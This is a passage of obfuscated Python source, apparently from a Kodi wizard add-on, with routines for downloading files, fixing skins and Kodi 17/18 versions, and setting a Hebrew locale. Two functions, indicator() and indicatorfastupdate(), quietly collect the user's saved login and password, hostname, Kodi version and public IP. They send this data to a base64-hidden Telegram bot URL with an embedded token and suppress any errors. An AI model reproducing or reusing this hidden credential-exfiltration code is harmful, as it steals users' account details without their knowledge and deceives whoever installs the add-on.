        OO0O0OO00O00OO000 =False #line:3454
  if OO0O0OO00O00OO000 :#line:3456
        OOO0OO00OO0O0OOO0 =int (OOO0OO00OO0O0OOO0 )#line:3457
  OO0000O000OO0O0OO =0 #line:3459
  OO000O0OO00000O00 =time .time ()#line:3460
  while True :#line:3461
        OO00O0000OO00O00O =OO000OO0O0000O0OO .read (8192 )#line:3462
        if not OO00O0000OO00O00O :#line:3463
            sys .stdout .write ('\n')#line:3464
            break #line:3465
        OO0000O000OO0O0OO +=len (OO00O0000OO00O00O )#line:3467
        O0O00O00O00000000 .write (OO00O0000OO00O00O )#line:3468
        if not OO0O0OO00O00OO000 :#line:3470
            OOO0OO00OO0O0OOO0 =OO0000O000OO0O0OO #line:3471
        if OO0O0O0O0OOOO00OO .iscanceled ():#line:3472
           OO0O0O0O0OOOO00OO .close ()#line:3473
           try :#line:3474
            os .remove (O0OO00OO00O0OO0O0 )#line:3475
           except :#line:3476
            pass #line:3477
           break #line:3478
        OO0OOOO0O0O0000O0 =float (OO0000O000OO0O0OO )/OOO0OO00OO0O0OOO0 #line:3479
        OO0OOOO0O0O0000O0 =round (OO0OOOO0O0O0000O0 *100 ,2 )#line:3480
        OO0000OO00O0OOOO0 =OO0000O000OO0O0OO /(1024 *1024 )#line:3481
        OOO0OOOOO00OO0000 =OOO0OO00OO0O0OOO0 /(1024 *1024 )#line:3482
        O00O00OO0O0O00000 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0000OO00O0OOOO0 ,'teal',OOO0OOOOO00OO0000 )#line:3483
        if (time .time ()-OO000O0OO00000O00 )>0 :#line:3484
          OOO00O000000O00OO =OO0000O000OO0O0OO /(time .time ()-OO000O0OO00000O00 )#line:3485
          OOO00O000000O00OO =OOO00O000000O00OO /1024 #line:3486
        else :#line:3487
         OOO00O000000O00OO =0 #line:3488
        O0O0000O0OOOO000O ='KB'#line:3489
        if OOO00O000000O00OO >=1024 :#line:3490
           OOO00O000000O00OO =OOO00O000000O00OO /1024 #line:3491
           O0O0000O0OOOO000O ='MB'#line:3492
        if OOO00O000000O00OO >0 and not OO0OOOO0O0O0000O0 ==100 :#line:3493
            O0000OOO0O00O0OO0 =(OOO0OO00OO0O0OOO0 -OO0000O000OO0O0OO )/OOO00O000000O00OO #line:3494
        else :#line:3495
            O0000OOO0O00O0OO0 =0 #line:3496
        OOO0OOO000OOOO00O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOO00O000000O00OO ,O0O0000O0OOOO000O )#line:3497
        OO0O0O0O0OOOO00OO .update (int (OO0OOOO0O0O0000O0 ),"Downloading "+name ,O00O00OO0O0O00000 ,OOO0OOO000OOOO00O )#line:3499
  OOO0OOO0O00O0OOOO =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3502
  O0O00O00O00000000 .close ()#line:3504
  extract (O0OO00OO00O0OO0O0 ,OOO0OOO0O00O0OOOO ,OO0O0O0O0OOOO00OO )#line:3506
  if os .path .exists (OOO0OOO0O00O0OOOO +'/scakemyer-script.quasar.burst'):#line:3507
    if os .path .exists (OOO0OOO0O00O0OOOO +'/script.quasar.burst'):#line:3508
     shutil .rmtree (OOO0OOO0O00O0OOOO +'/script.quasar.burst',ignore_errors =False )#line:3509
    os .rename (OOO0OOO0O00O0OOOO +'/scakemyer-script.quasar.burst',OOO0OOO0O00O0OOOO +'/script.quasar.burst')#line:3510
  if os .path .exists (OOO0OOO0O00O0OOOO +'/plugin.video.kmediatorrent-master'):#line:3512
    if os .path .exists (OOO0OOO0O00O0OOOO +'/plugin.video.kmediatorrent'):#line:3513
     shutil .rmtree (OOO0OOO0O00O0OOOO +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3514
    os .rename (OOO0OOO0O00O0OOOO +'/plugin.video.kmediatorrent-master',OOO0OOO0O00O0OOOO +'/plugin.video.kmediatorrent')#line:3515
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3516
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3517
  try :#line:3518
    os .remove (O0OO00OO00O0OO0O0 )#line:3519
  except :#line:3520
    pass #line:3521
  OO0O0O0O0OOOO00OO .close ()#line:3522
def dis_or_enable_addon (OOO0O00OOOO0O00O0 ,O00000OO0O0OO0000 ,enable ="true"):#line:3523
    import json #line:3524
    O0O00O00OOO0OOOOO ='"%s"'%OOO0O00OOOO0O00O0 #line:3525
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OOO0O00OOOO0O00O0 )and enable =="true":#line:3526
        logging .warning ('already Enabled')#line:3527
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OOO0O00OOOO0O00O0 )#line:3528
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OOO0O00OOOO0O00O0 )and enable =="false":#line:3529
        return xbmc .log ("### Skipped %s, reason = not installed"%OOO0O00OOOO0O00O0 )#line:3530
    else :#line:3531
        OO0OO0OOOOO0OO000 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O0O00O00OOO0OOOOO ,enable )#line:3532
        O0000O00O000OO000 =xbmc .executeJSONRPC (OO0OO0OOOOO0OO000 )#line:3533
        OOOOO00O00OOOO0O0 =json .loads (O0000O00O000OO000 )#line:3534
        if enable =="true":#line:3535
            xbmc .log ("### Enabled %s, response = %s"%(OOO0O00OOOO0O00O0 ,OOOOO00O00OOOO0O0 ))#line:3536
        else :#line:3537
            xbmc .log ("### Disabled %s, response = %s"%(OOO0O00OOOO0O00O0 ,OOOOO00O00OOOO0O0 ))#line:3538
    if O00000OO0O0OO0000 =='auto':#line:3539
     return True #line:3540
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3541
def chunk_report (OO0OOOO0OOOOOO00O ,OOO0O0O0O0OOOO0OO ,O000O00O0O0OOO000 ):#line:3542
   OOO0000OOOOOO00OO =float (OO0OOOO0OOOOOO00O )/O000O00O0O0OOO000 #line:3543
   OOO0000OOOOOO00OO =round (OOO0000OOOOOO00OO *100 ,2 )#line:3544
   if OO0OOOO0OOOOOO00O >=O000O00O0O0OOO000 :#line:3546
      sys .stdout .write ('\n')#line:3547
def chunk_read (OOO0000O000O00000 ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3549
   import time #line:3550
   O00O0000OOO00OO00 =int (filesize )*1000000 #line:3551
   O00OOOO00O0OOO00O =0 #line:3553
   O0OOO0O00OO0O000O =time .time ()#line:3554
   OO000OOOOO00O00OO =0 #line:3555
   logging .warning ('Downloading')#line:3557
   with open (destination ,"wb")as OOO0O0O0OOOO00OO0 :#line:3558
    while 1 :#line:3559
      OOOO0O0000OO0O0OO =time .time ()-O0OOO0O00OO0O000O #line:3560
      OOO000O0OO0OOO0OO =int (OO000OOOOO00O00OO *chunk_size )#line:3561
      OO00OO00O000000O0 =OOO0000O000O00000 .read (chunk_size )#line:3562
      OOO0O0O0OOOO00OO0 .write (OO00OO00O000000O0 )#line:3563
      OOO0O0O0OOOO00OO0 .flush ()#line:3564
      O00OOOO00O0OOO00O +=len (OO00OO00O000000O0 )#line:3565
      OOOOOOOOO000OO000 =float (O00OOOO00O0OOO00O )/O00O0000OOO00OO00 #line:3566
      OOOOOOOOO000OO000 =round (OOOOOOOOO000OO000 *100 ,2 )#line:3567
      if int (OOOO0O0000OO0O0OO )>0 :#line:3568
        O0OO0000000O0O0OO =int (OOO000O0OO0OOO0OO /(1024 *OOOO0O0000OO0O0OO ))#line:3569
      else :#line:3570
         O0OO0000000O0O0OO =0 #line:3571
      if O0OO0000000O0O0OO >1024 and not OOOOOOOOO000OO000 ==100 :#line:3572
          OO00O0O0O0O0OO0OO =int (((O00O0000OOO00OO00 -OOO000O0OO0OOO0OO )/1024 )/(O0OO0000000O0O0OO ))#line:3573
      else :#line:3574
          OO00O0O0O0O0OO0OO =0 #line:3575
      if OO00O0O0O0O0OO0OO <0 :#line:3576
        OO00O0O0O0O0OO0OO =0 #line:3577
      dp .update (int (OOOOOOOOO000OO000 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OOOOOOOOO000OO000 ,OOO000O0OO0OOO0OO /(1024 *1024 ),O00O0000OOO00OO00 /(1000 *1000 ),O0OO0000000O0O0OO ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OO00O0O0O0O0OO0OO ,60 ))#line:3578
      if dp .iscanceled ():#line:3579
         dp .close ()#line:3580
         break #line:3581
      if not OO00OO00O000000O0 :#line:3582
         break #line:3583
      if report_hook :#line:3585
         report_hook (O00OOOO00O0OOO00O ,chunk_size ,O00O0000OOO00OO00 )#line:3586
      OO000OOOOO00O00OO +=1 #line:3587
   logging .warning ('END Downloading')#line:3588
   return O00OOOO00O0OOO00O #line:3589
def googledrive_download (O00OOOOOOO0O00OO0 ,O00OOOOO0O00O0O00 ,OO000O000OOO0O0OO ,OO0OOOO00OO0OOO0O ):#line:3591
    OOOO00O0O0O0O00OO =[]#line:3595
    O0OO0OO000000000O =O00OOOOOOO0O00OO0 .split ('=')#line:3596
    O00OOOOOOO0O00OO0 =O0OO0OO000000000O [len (O0OO0OO000000000O )-1 ]#line:3597
    def OOO0O00000OO0000O (OOO00O0OO0O0O0O00 ):#line:3599
        for OOOO00OOO0O00OOOO in OOO00O0OO0O0O0O00 :#line:3601
            logging .warning ('cookie.name')#line:3602
            logging .warning (OOOO00OOO0O00OOOO .name )#line:3603
            O0O000O0O00000000 =OOOO00OOO0O00OOOO .value #line:3604
            if 'download_warning'in OOOO00OOO0O00OOOO .name :#line:3605
                logging .warning (OOOO00OOO0O00OOOO .value )#line:3606
                logging .warning ('cookie.value')#line:3607
                return OOOO00OOO0O00OOOO .value #line:3608
            return O0O000O0O00000000 #line:3609
        return None #line:3611
    def OO00O0O0O0OOO00OO (O000000O000000OO0 ,OO0OOO0OOO0O0O0O0 ):#line:3613
        O00O000O0O000O0OO =32768 #line:3615
        O0000OOOO0OOO00O0 =time .time ()#line:3616
        with open (OO0OOO0OOO0O0O0O0 ,"wb")as OO000OOOO000OO000 :#line:3618
            OO00OOOO0OOOO0O00 =1 #line:3619
            O000O00OO00O0OOO0 =32768 #line:3620
            try :#line:3621
                O00O0O00O00OO00OO =int (O000000O000000OO0 .headers .get ('content-length'))#line:3622
                print ('file total size :',O00O0O00O00OO00OO )#line:3623
            except TypeError :#line:3624
                print ('using dummy length !!!')#line:3625
                O00O0O00O00OO00OO =int (OO0OOOO00OO0OOO0O )*1000000 #line:3626
            for OOO0OO00OOO000000 in O000000O000000OO0 .iter_content (O00O000O0O000O0OO ):#line:3627
                if OOO0OO00OOO000000 :#line:3628
                    OO000OOOO000OO000 .write (OOO0OO00OOO000000 )#line:3629
                    OO000OOOO000OO000 .flush ()#line:3630
                    O0OO0OOOO0000OOOO =time .time ()-O0000OOOO0OOO00O0 #line:3631
                    OOO00OO000OOO0O0O =int (OO00OOOO0OOOO0O00 *O000O00OO00O0OOO0 )#line:3632
                    if O0OO0OOOO0000OOOO ==0 :#line:3633
                        O0OO0OOOO0000OOOO =0.1 #line:3634
                    O0000O0O0OO0O00O0 =int (OOO00OO000OOO0O0O /(1024 *O0OO0OOOO0000OOOO ))#line:3635
                    O000O00O0O000000O =int (OO00OOOO0OOOO0O00 *O000O00OO00O0OOO0 *100 /O00O0O00O00OO00OO )#line:3636
                    if O0000O0O0OO0O00O0 >1024 and not O000O00O0O000000O ==100 :#line:3637
                      O0O0O00OO00OOO000 =int (((O00O0O00O00OO00OO -OOO00OO000OOO0O0O )/1024 )/(O0000O0O0OO0O00O0 ))#line:3638
                    else :#line:3639
                      O0O0O00OO00OOO000 =0 #line:3640
                    OO000O000OOO0O0OO .update (int (O000O00O0O000000O ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O000O00O0O000000O ,OOO00OO000OOO0O0O /(1024 *1024 ),O00O0O00O00OO00OO /(1000 *1000 ),O0000O0O0OO0O00O0 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O0O0O00OO00OOO000 ,60 ))#line:3642
                    OO00OOOO0OOOO0O00 +=1 #line:3643
                    if OO000O000OOO0O0OO .iscanceled ():#line:3644
                     OO000O000OOO0O0OO .close ()#line:3645
                     break #line:3646
    OOOOOOOO00OOOO00O ="https://docs.google.com/uc?export=download"#line:3647
    import urllib2 #line:3652
    import cookielib #line:3653
    from cookielib import CookieJar #line:3655
    O0OOOO00OOOOOOO00 =CookieJar ()#line:3657
    OO00OO0000OOOO0O0 =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (O0OOOO00OOOOOOO00 ))#line:3658
    O0OO0O000OO0OOOOO ={'id':O00OOOOOOO0O00OO0 }#line:3660
    OOO000OO0000OOO0O =urllib .urlencode (O0OO0O000OO0OOOOO )#line:3661
    logging .warning (OOOOOOOO00OOOO00O +'&'+OOO000OO0000OOO0O )#line:3662
    OO00OOO0O0O0O0000 =OO00OO0000OOOO0O0 .open (OOOOOOOO00OOOO00O +'&'+OOO000OO0000OOO0O )#line:3663
    O000O00O00OOOO000 =OO00OOO0O0O0O0000 .read ()#line:3664
    for OO000OOO0O00O0OO0 in O0OOOO00OOOOOOO00 :#line:3666
         logging .warning (OO000OOO0O00O0OO0 )#line:3667
    OOOOOO00OO0000OO0 =OOO0O00000OO0000O (O0OOOO00OOOOOOO00 )#line:3668
    logging .warning (OOOOOO00OO0000OO0 )#line:3669
    if OOOOOO00OO0000OO0 :#line:3670
        OOOOOO000OOOOO0O0 ={'id':O00OOOOOOO0O00OO0 ,'confirm':OOOOOO00OO0000OO0 }#line:3671
        O0OOO0OO0O0OO0O0O ={'Access-Control-Allow-Headers':'Content-Length'}#line:3672
        OOO000OO0000OOO0O =urllib .urlencode (OOOOOO000OOOOO0O0 )#line:3673
        OO00OOO0O0O0O0000 =OO00OO0000OOOO0O0 .open (OOOOOOOO00OOOO00O +'&'+OOO000OO0000OOO0O )#line:3674
        chunk_read (OO00OOO0O0O0O0000 ,report_hook =chunk_report ,dp =OO000O000OOO0O0OO ,destination =O00OOOOO0O00O0O00 ,filesize =OO0OOOO00OO0OOO0O )#line:3675
    return (OOOO00O0O0O0O00OO )#line:3679
def kodi17Fix ():#line:3680
	OO0OOOOO0O00OOOOO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3681
	OOO00OO0OOO0OOO00 =[]#line:3682
	for O00O00OO0OOO0O0OO in sorted (OO0OOOOO0O00OOOOO ,key =lambda OOO000O0OOO0O0O0O :OOO000O0OOO0O0O0O ):#line:3683
		O00OOOO000O0O0O0O =os .path .join (O00O00OO0OOO0O0OO ,'addon.xml')#line:3684
		if os .path .exists (O00OOOO000O0O0O0O ):#line:3685
			OOO0O000OO0OO0O0O =O00O00OO0OOO0O0OO .replace (ADDONS ,'')[1 :-1 ]#line:3686
			O00000OOOO0OO0O0O =open (O00OOOO000O0O0O0O )#line:3687
			O0O00OO00OOOO0000 =O00000OOOO0OO0O0O .read ()#line:3688
			O0OO00OOOO0O0O0O0 =parseDOM (O0O00OO00OOOO0000 ,'addon',ret ='id')#line:3689
			O00000OOOO0OO0O0O .close ()#line:3690
			try :#line:3691
				OOOOO0OOOO0O0O0O0 =xbmcaddon .Addon (id =O0OO00OOOO0O0O0O0 [0 ])#line:3692
			except :#line:3693
				try :#line:3694
					log ("%s was disabled"%O0OO00OOOO0O0O0O0 [0 ],xbmc .LOGDEBUG )#line:3695
					OOO00OO0OOO0OOO00 .append (O0OO00OOOO0O0O0O0 [0 ])#line:3696
				except :#line:3697
					try :#line:3698
						log ("%s was disabled"%OOO0O000OO0OO0O0O ,xbmc .LOGDEBUG )#line:3699
						OOO00OO0OOO0OOO00 .append (OOO0O000OO0OO0O0O )#line:3700
					except :#line:3701
						if len (O0OO00OOOO0O0O0O0 )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%OOO0O000OO0OO0O0O ,xbmc .LOGERROR )#line:3702
						else :log ("Unabled to enable: %s"%O00O00OO0OOO0O0OO ,xbmc .LOGERROR )#line:3703
	if len (OOO00OO0OOO0OOO00 )>0 :#line:3704
		O0OOO00OO00O0O0O0 =0 #line:3705
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3706
		for O0OOO0OOOO000O00O in OOO00OO0OOO0OOO00 :#line:3707
			O0OOO00OO00O0O0O0 +=1 #line:3708
			OOOO0O0O0OOO00OO0 =int (percentage (O0OOO00OO00O0O0O0 ,len (OOO00OO0OOO0OOO00 )))#line:3709
			DP .update (OOOO0O0O0OOO00OO0 ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOO0OOOO000O00O ))#line:3710
			addonDatabase (O0OOO0OOOO000O00O ,1 )#line:3711
			if DP .iscanceled ():break #line:3712
		if DP .iscanceled ():#line:3713
			DP .close ()#line:3714
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3715
			sys .exit ()#line:3716
		DP .close ()#line:3717
	forceUpdate ()#line:3718
def indicator ():#line:3720
       try :#line:3721
          import json #line:3722
          wiz .log ('FRESH MESSAGE')#line:3723
          O00000OO00OO0OO00 =(ADDON .getSetting ("user"))#line:3724
          OO0O000O00OO0O0O0 =(ADDON .getSetting ("pass"))#line:3725
          OOO00O0OOOO00OO00 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3726
          OOO0O000OO0O00000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3727
          OO00000OO00OOOO00 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3728
          OOOOO0OO0OO0O0O00 =str (json .loads (OO00000OO00OOOO00 )['ip'])#line:3729
          OOOOOOO000OOO00OO =O00000OO00OO0OO00 #line:3730
          OO00000O0O0000000 =OO0O000O00OO0O0O0 #line:3731
          import socket #line:3732
          OO00000OO00OOOO00 =urllib2 .urlopen (OOO0O000OO0O00000 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OOOOOOO000OOO00OO +' - '+OO00000O0O0000000 +' - '+OOO00O0OOOO00OO00 +' - '+OOOOO0OO0OO0O0O00 ).readlines ()#line:3733
       except :pass #line:3735
def indicatorfastupdate ():#line:3737
       try :#line:3738
          import json #line:3739
          wiz .log ('FRESH MESSAGE')#line:3740
          O000000OO00O00OO0 =(ADDON .getSetting ("user"))#line:3741
          O000OOOO000000O0O =(ADDON .getSetting ("pass"))#line:3742
          OOO00O0O0OOO0OO00 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3743
          OO0O0O0000O0O00O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3745
          O00OO00O00O0OO00O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3746
          OO0OO000O000OO00O =str (json .loads (O00OO00O00O0OO00O )['ip'])#line:3747
          O0O00O0O000O0O0O0 =O000000OO00O00OO0 #line:3748
          OOO00OOOOO0OO0000 =O000OOOO000000O0O #line:3749
          import socket #line:3751
          O00OO00O00O0OO00O =urllib2 .urlopen (OO0O0O0000O0O00O0 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O0O00O0O000O0O0O0 +' - '+OOO00OOOOO0OO0000 +' - '+OOO00O0O0OOO0OO00 +' - '+OO0OO000O000OO00O ).readlines ()#line:3752
       except :pass #line:3754
def skinfix18 ():#line:3756
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3757
		OOO0O0OOO00OO000O =wiz .workingURL (SKINID18DDONXML )#line:3758
		if OOO0O0OOO00OO000O ==True :#line:3759
			O000O0OOO0OO0O0O0 =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3760
			if len (O000O0OOO0OO0O0O0 )>0 :#line:3761
				OOO0OO0O0OO0OO0O0 ='%s-%s.zip'%(SKINID18 ,O000O0OOO0OO0O0O0 [0 ])#line:3762
				OOO0000OOO0OOOO0O =wiz .workingURL (SKIN18ZIPURL +OOO0OO0O0OO0OO0O0 )#line:3763
				if OOO0000OOO0OOOO0O ==True :#line:3764
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3765
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3766
					O0OOO0OOOOOOOOO00 =os .path .join (PACKAGES ,OOO0OO0O0OO0OO0O0 )#line:3767
					try :os .remove (O0OOO0OOOOOOOOO00 )#line:3768
					except :pass #line:3769
					downloader .download (SKIN18ZIPURL +OOO0OO0O0OO0OO0O0 ,O0OOO0OOOOOOOOO00 ,DP )#line:3770
					extract .all (O0OOO0OOOOOOOOO00 ,HOME ,DP )#line:3771
					try :#line:3772
						O00000OO00OOO0O00 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3773
						O0000OO0OOOO0O0O0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3774
						os .rename (O00000OO00OOO0O00 ,O0000OO0OOOO0O0O0 )#line:3775
					except :#line:3776
						pass #line:3777
					try :#line:3778
						O0000OOO00000OO0O =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');OO000OOO0OOO00000 =O0000OOO00000OO0O .read ();O0000OOO00000OO0O .close ()#line:3779
						OOO0OO00000OOO000 =wiz .parseDOM (OO000OOO0OOO00000 ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3780
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OO00000OOO000 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3781
					except :#line:3782
						pass #line:3783
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3784
					DP .close ()#line:3785
					xbmc .sleep (500 )#line:3786
					wiz .forceUpdate (True )#line:3787
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3788
				else :#line:3789
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3790
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OOO0000OOO0OOOO0O ,xbmc .LOGERROR )#line:3791
			else :#line:3792
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3793
		else :#line:3794
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3795
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3796
def skinfix17 ():#line:3797
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3798
		OO0OOO0000O0O0OO0 =wiz .workingURL (SKINID17DDONXML )#line:3799
		if OO0OOO0000O0O0OO0 ==True :#line:3800
			O0O0O0000O00OOO0O =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3801
			if len (O0O0O0000O00OOO0O )>0 :#line:3802
				OOO0O0O0000OO0O0O ='%s-%s.zip'%(SKINID17 ,O0O0O0000O00OOO0O [0 ])#line:3803
				O0O0OO00O00O0OO0O =wiz .workingURL (SKIN17ZIPURL +OOO0O0O0000OO0O0O )#line:3804
				if O0O0OO00O00O0OO0O ==True :#line:3805
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3806
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3807
					OO0OO0O00OO0O0OO0 =os .path .join (PACKAGES ,OOO0O0O0000OO0O0O )#line:3808
					try :os .remove (OO0OO0O00OO0O0OO0 )#line:3809
					except :pass #line:3810
					downloader .download (SKIN17ZIPURL +OOO0O0O0000OO0O0O ,OO0OO0O00OO0O0OO0 ,DP )#line:3811
					extract .all (OO0OO0O00OO0O0OO0 ,HOME ,DP )#line:3812
					try :#line:3813
						OO00O0O0O0O0O0000 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3814
						O00OO0O0O000000OO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3815
						os .rename (OO00O0O0O0O0O0000 ,O00OO0O0O000000OO )#line:3816
					except :#line:3817
						pass #line:3818
					try :#line:3819
						OO0O0OOOOO0OO0000 =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');O00OO0O000O0OO0O0 =OO0O0OOOOO0OO0000 .read ();OO0O0OOOOO0OO0000 .close ()#line:3820
						O00O0OO00O00OO0O0 =wiz .parseDOM (O00OO0O000O0OO0O0 ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3821
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00O0OO00O00OO0O0 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3822
					except :#line:3823
						pass #line:3824
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3825
					DP .close ()#line:3826
					xbmc .sleep (500 )#line:3827
					wiz .forceUpdate (True )#line:3828
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3829
				else :#line:3830
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3831
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O0O0OO00O00O0OO0O ,xbmc .LOGERROR )#line:3832
			else :#line:3833
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3834
		else :#line:3835
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3836
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3837
def fix17update ():#line:3838
	if KODIV >=17 and KODIV <18 :#line:3839
		wiz .kodi17Fix ()#line:3840
		xbmc .sleep (4000 )#line:3841
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3842
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3843
		fixfont ()#line:3844
		O00OO000000OO0O00 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3845
		try :#line:3847
			O0OO00000OOOO0O0O =open (O00OO000000OO0O00 ,'r')#line:3848
			OO0O0O000OOO0000O =O0OO00000OOOO0O0O .read ()#line:3849
			O0OO00000OOOO0O0O .close ()#line:3850
			OOO0OOO0O00O0000O ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3851
			O00OO00000O00000O =re .compile (OOO0OOO0O00O0000O ).findall (OO0O0O000OOO0000O )[0 ]#line:3852
			O0OO00000OOOO0O0O =open (O00OO000000OO0O00 ,'w')#line:3853
			O0OO00000OOOO0O0O .write (OO0O0O000OOO0000O .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%O00OO00000O00000O ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3854
			O0OO00000OOOO0O0O .close ()#line:3855
		except :#line:3856
				pass #line:3857
		wiz .kodi17Fix ()#line:3858
		O00OO000000OO0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3859
		try :#line:3860
			O0OO00000OOOO0O0O =open (O00OO000000OO0O00 ,'r')#line:3861
			OO0O0O000OOO0000O =O0OO00000OOOO0O0O .read ()#line:3862
			O0OO00000OOOO0O0O .close ()#line:3863
			OOO0OOO0O00O0000O ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3864
			O00OO00000O00000O =re .compile (OOO0OOO0O00O0000O ).findall (OO0O0O000OOO0000O )[0 ]#line:3865
			O0OO00000OOOO0O0O =open (O00OO000000OO0O00 ,'w')#line:3866
			O0OO00000OOOO0O0O .write (OO0O0O000OOO0000O .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%O00OO00000O00000O ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3867
			O0OO00000OOOO0O0O .close ()#line:3868
		except :#line:3869
				pass #line:3870
		swapSkins ('skin.Premium.mod')#line:3871
def fix18update ():#line:3873
	if KODIV >=18 :#line:3874
